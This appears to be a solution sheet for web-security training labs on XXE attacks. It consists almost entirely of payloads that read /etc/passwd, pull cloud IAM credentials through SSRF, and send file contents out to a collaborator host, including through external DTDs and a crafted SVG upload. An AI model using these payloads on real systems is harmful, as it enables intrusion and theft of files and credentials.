## Exploiting XXE using external entities to retrieve files

Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

## Exploiting XInclude to retrieve files

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Exploiting XXE to perform SSRF attacks

Insert the following external entity definition in between the XML declaration and the stockCheck element:

```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```
Iteratively update the URL in the DTD to explore the API until you reach `/latest/meta-data/iam/security-credentials/admin`. 
This should return JSON containing the SecretAccessKey. 

## Blind XXE with out-of-band interaction

```
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
+ replace ProductId with: &xxe;
```
```
<!DOCTYPE stockcheck [<!ENTITY % h1z54 SYSTEM "http://5lrwsx6c6dlkgmtrewokp6zxooufic61.oastify.com">%h1z54; ]>
```

Replace the productId number with a reference to the external entity: &xxe;

## Blind XXE with out-of-band interaction via XML parameter entities
```
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

## Exploiting blind XXE to retrieve data via error messages

Exploit Server:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
Between XML declaration and stockCheck:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```


## Exploiting blind XXE to exfiltrate data using a malicious external DTD

Exploit Server:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```
Between XML declaration and stockCheck:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL (exploit server)"> %xxe;]>
```

## Exploiting XXE via image file upload

1) Create a local SVG image with the following content: 
```
## <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

2) Post a comment on a blog post, and upload this image as an avatar. 
3) When you view your comment, you should see the contents of the /etc/hostname file in your image.
